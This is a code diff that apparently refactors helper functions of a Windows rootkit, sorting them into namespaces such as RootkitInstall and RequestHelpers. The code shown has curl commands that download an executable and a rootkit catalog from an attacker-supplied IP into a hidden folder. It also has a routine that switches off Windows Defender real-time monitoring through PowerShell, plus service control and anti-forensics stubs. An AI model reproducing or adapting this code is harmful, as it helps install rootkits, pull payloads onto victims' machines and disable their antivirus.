@@ -1,7 +1,10 @@
 #include "helpers.h"
+#pragma warning(disable : 4244)
+#pragma warning(disable : 4267)
+#define MEDIUM_AS_SOURCE_MODULE "mymyymym"
 
 
-std::uint32_t GetPID(std::string PrcName) {
+std::uint32_t GeneralHelpers::GetPID(std::string PrcName) {
 	PROCESSENTRY32 PrcEntry;
 	const UniqueHndl snapshot_handle(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL));  // take snapshot of all current processes
 	if (snapshot_handle.get() == INVALID_HANDLE_VALUE) {
@@ -20,29 +23,14 @@ std::uint32_t GetPID(std::string PrcName) {
 }
 
 
-BOOL ValidateInfoTypeString(const char* InfoType) {
-	if (strlen(InfoType) > 5 || strlen(InfoType) == 0) {
-		return FALSE;
-	}
-
-	std::string cppString("rbptcPieIL");
-	for (int i = 0; InfoType[i] != '\0'; i++) {
-		if (cppString.find(InfoType[i]) == std::string::npos) {
-			return FALSE;
-		}
-	}
-	return TRUE;
-}
-
-
-int CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString) {
+int GeneralHelpers::CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString) {
     int WideNameLen = MultiByteToWideChar(CP_UTF8, 0, ConvertString, -1, NULL, 0);
     MultiByteToWideChar(CP_UTF8, 0, ConvertString, -1, ConvertedString, WideNameLen);
     return WideNameLen;
 }
 
 
-int WcharpToCharp(char* ConvertedString, const WCHAR* ConvertString) {
+int GeneralHelpers::WcharpToCharp(char* ConvertedString, const WCHAR* ConvertString) {
     int MultiByteLen = WideCharToMultiByte(CP_UTF8, 0, ConvertString, -1, NULL, 0, NULL, NULL);
     WideCharToMultiByte(CP_UTF8, 0, ConvertString, -1, ConvertedString, MultiByteLen, NULL, NULL);
     return MultiByteLen;
@@ -57,7 +45,7 @@ std::wstring GetCurrentPath() {
 }
 
 
-int CountOccurrences(const char* SearchStr, char SearchLetter) {
+int GeneralHelpers::CountOccurrences(const char* SearchStr, char SearchLetter) {
     DWORD Count = 0;
     for (int i = 0; i < strlen(SearchStr); i++) {
         if (SearchStr[i] == SearchLetter) {
@@ -68,7 +56,7 @@ int CountOccurrences(const char* SearchStr, char SearchLetter) {
 }
 
 
-void GetServiceName(char* Path, char* Buffer) {
+void GeneralHelpers::GetServiceName(char* Path, char* Buffer) {
     char TempBuffer[MAX_PATH] = { 0 };
     int bi = 0;
     int acbi = 0;
@@ -87,7 +75,7 @@ void GetServiceName(char* Path, char* Buffer) {
 }
 
 
-void ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size) {
+void GeneralHelpers::ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size) {
     int ii = 0;
     int repi = 0;
     int comi = 0;
@@ -110,7 +98,7 @@ void ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, i
 }
 
 
-DWORD ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size) {
+DWORD GeneralHelpers::ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size) {
     char Command[500] = { 0 };
     ReplaceValues(BaseCommand, RepArr, Command, Size);
     if (system(Command) == -1) {
@@ -120,7 +108,7 @@ DWORD ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size) {
 }
 
 
-void GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension) {
+void GeneralHelpers::GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension) {
     const char* Alp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,;[]{}-_=+)(&^%$#@!~`";
     std::random_device rd;
     std::mt19937 gen(rd());
@@ -135,7 +123,7 @@ void GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension) {
 }
 
 
-int GetPidByName(const char* Name) {
+int GeneralHelpers::GetPidByName(const char* Name) {
     int ProcessId = 0;
     DWORD Procs[1024] = { 0 }, BytesReturned = 0, ProcessesNum = 0;
     char CurrentName[MAX_PATH] = { 0 };
@@ -166,7 +154,7 @@ int GetPidByName(const char* Name) {
 }
 
 
-int CheckLetterInArr(char Chr, const char* Arr) {
+int GeneralHelpers::CheckLetterInArr(char Chr, const char* Arr) {
     for (int i = 0; i < strlen(Arr); i++) {
         if (Arr[i] == Chr) {
             return i;
@@ -176,7 +164,7 @@ int CheckLetterInArr(char Chr, const char* Arr) {
 }
 
 
-BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount) {
+BOOL GeneralHelpers::PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount) {
     int ActualSize = 1;
     int CurrRepIndex = 0;
     int ActualCommandIndex = 0;
@@ -223,7 +211,7 @@ BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const 
 }
 
 
-int VerifyDependencies(const char* AttackerIp) {
+int RootkitInstall::VerifyDependencies(const char* AttackerIp) {
     const char* FileCommands[] = { "if not exist C:\\nosusfolder\\verysus mkdir C:\\nosusfolder\\verysus && ",
         "curl http://~:8080/WebScraper/x64/Release/WebScraper.exe --output C:\\nosusfolder\\verysus\\WebScraper.exe && ",
         "curl http://~:8080/rootkit_catalog.txt --output C:\\nosusfolder\\verysus\\rootkit_catalog.txt && ",
@@ -232,14 +220,14 @@ int VerifyDependencies(const char* AttackerIp) {
     const char* ReplaceArr[1] = { AttackerIp };
     const char* SymbolsArr = "~";
     const int TotalCommands = 4;
-    if (!PerformCommand(FileCommands, ReplaceArr, SymbolsArr, TotalCommands, 1)) {
+    if (!GeneralHelpers::PerformCommand(FileCommands, ReplaceArr, SymbolsArr, TotalCommands, 1)) {
         return (int)GetLastError();
     }
     return 0;
 }
 
 
-BOOL WINAPI CtrlHandler(DWORD ControlType) {
+BOOL WINAPI RootkitInstall::CtrlHandler(DWORD ControlType) {
     switch (ControlType) {
     case CTRL_SHUTDOWN_EVENT: 
         system("sc stop RootAuto");
@@ -252,7 +240,7 @@ BOOL WINAPI CtrlHandler(DWORD ControlType) {
 }
 
 
-RETURN_LAST RealTime(BOOL IsDisable) {
+RETURN_LAST RootkitInstall::RealTime(BOOL IsDisable) {
     RETURN_LAST LastError = { 0, ERROR_SUCCESS };
     const char* Disable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $true\" > nul";
     const char* Enable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $false\" > nul";
@@ -273,7 +261,22 @@ RETURN_LAST RealTime(BOOL IsDisable) {
 }
 
 
-void LogMessage(const char* Message, LogFile* MediumLog, BOOL IsError, int ErrorCode) {
+BOOL RequestHelpers::ValidateInfoTypeString(const char* InfoType) {
+    if (strlen(InfoType) > 5 || strlen(InfoType) == 0) {
+        return FALSE;
+    }
+
+    std::string cppString("rbptcPieIL");
+    for (int i = 0; InfoType[i] != '\0'; i++) {
+        if (cppString.find(InfoType[i]) == std::string::npos) {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+
+void RequestHelpers::LogMessage(const char* Message, LogFile* MediumLog, BOOL IsError, int ErrorCode) {
     printf(Message);
     if (MediumLog != NULL) {
         if (IsError) {
@@ -291,13 +294,13 @@ void LogMessage(const char* Message, LogFile* MediumLog, BOOL IsError, int Error
 }
 
 
-BOOL ShouldQuit() {
+BOOL RequestHelpers::ShouldQuit() {
     // Returns if the medium should stop working (debugging, forensics, special errors..) -
     return FALSE;
 }
 
 
-int FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData, ULONG64* FileDataSize, BOOL IsWrite) {
+int RequestHelpers::FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData, ULONG64* FileDataSize, BOOL IsWrite) {
     DWORD OperationOutput = 0;
     if (FileHandle == NULL || FilePath == NULL || FileData == NULL || FileDataSize == NULL) {
         return -1;
@@ -333,4 +336,22 @@ int FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData, ULONG64* 
     }
     CloseHandle(*FileHandle);
     return 0;
+}
+
+
+ROOTKIT_UNEXERR RequestHelpers::ResolvePID(char* ModuleName, ULONG64* ProcessId) {
+    if (ModuleName == NULL || ProcessId == NULL) {
+        return invalidargs;
+    }
+    if (strcmp(ModuleName, MEDIUM_AS_SOURCE_MODULE) == 0 ||
+        strcmp(ModuleName, REGULAR_BUFFER_WRITE) == 0) {
+        *ProcessId = (ULONG64)GetCurrentProcessId();
+    }
+    else {
+        *ProcessId = (ULONG64)GeneralHelpers::GetPID(ModuleName);
+    }
+    if (*ProcessId == 0) {
+        return relevantpid;
+    }
+    return successful;
 }
